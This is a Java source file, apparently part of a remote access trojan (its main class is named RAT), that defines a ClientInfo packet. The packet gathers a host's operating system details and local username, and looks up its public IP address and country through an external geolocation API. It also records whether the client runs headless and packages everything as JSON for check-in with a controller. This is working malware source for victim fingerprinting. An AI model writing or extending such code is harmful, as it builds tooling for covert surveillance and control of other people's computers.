package electron.networking.packets;

import java.awt.GraphicsEnvironment;
import java.io.IOException;

import org.json.simple.JSONObject;
import org.json.simple.parser.ParseException;

import electron.RAT;
import electron.console.logger;
import electron.networking.Web;
import electron.tools.FileOptions;

public class ClientInfo {
	private String os = "-";
	private String net_address = "-";
	private String username = "-";
	private String country = "-";

	public ClientInfo(String os, String net_address, String username, String country) {
		this.os = os;
		this.net_address = net_address;
		this.username = username;
		this.country = country;
	}

	public String getOs() {
		return os;
	}

	public String getNet_address() {
		return net_address;
	}

	public String getUsername() {
		return username;
	}

	public String getCountry() {
		return country;
	}

	public JSONObject getJSON() {
		JSONObject out = new JSONObject();
		out.put("packettype", "0");
		out.put("os", os);
		out.put("net_address", net_address);
		out.put("username", username);
		out.put("country", country);
		out.put("native-image", String.valueOf(RAT.isNativeImage));
		out.put("headless", GraphicsEnvironment.isHeadless());
		return out;
	}

	public static ClientInfo generatePacket() {
		String os = System.getProperty("os.name") + " " + System.getProperty("os.arch") + " "
				+ System.getProperty("os.version");
		String username = System.getProperty("user.name");
		String net_address = "-";
		String country = "-";
		// Getting data from Internet
		try {
			JSONObject APIanswer = (JSONObject) FileOptions.ParseJsThrought(Web.get("https://api.country.is/"));
			net_address = String.valueOf(APIanswer.get("ip"));
			country = String.valueOf(APIanswer.get("country"));
		} catch (ParseException | IOException e) {
			logger.warn("[electron.networking.packets.ClientInfo.generatePacket]: I/O or Parse exception: "
					+ e.getMessage());
		}
		// Generate packet
		return new ClientInfo(os, net_address, username, country);
	}
}
